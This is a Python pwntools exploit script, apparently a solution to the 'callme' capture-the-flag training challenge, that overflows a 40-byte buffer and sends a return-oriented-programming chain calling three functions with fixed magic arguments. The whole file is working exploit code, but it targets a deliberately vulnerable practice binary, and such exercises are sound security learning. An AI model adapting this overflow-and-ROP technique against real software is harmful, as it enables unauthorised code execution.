#!/usr/bin/env python3

from pwn import *

def start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)
		
gdbscript='''

'''.format(**locals())

exe = "./callme"
context.binary = elf = ELF(exe, checksec=False)
rop = ROP(elf)

io = start()

pop_gadget = rop.find_gadget(['pop rdi','pop rsi','pop rdx', 'ret'])[0]

rop.call(pop_gadget)
rop.raw(0xdeadbeefdeadbeef)
rop.raw(0xcafebabecafebabe)
rop.raw(0xd00df00dd00df00d)
rop.call(elf.plt.callme_one)
rop.call(pop_gadget)
rop.raw(0xdeadbeefdeadbeef)
rop.raw(0xcafebabecafebabe)
rop.raw(0xd00df00dd00df00d)
rop.call(elf.plt.callme_two)
rop.call(pop_gadget)
rop.raw(0xdeadbeefdeadbeef)
rop.raw(0xcafebabecafebabe)
rop.raw(0xd00df00dd00df00d)
rop.call(elf.plt.callme_three)

print(rop.dump())
io.sendlineafter(b"> ", b"A"* 40 + rop.chain())

print(io.recvall())

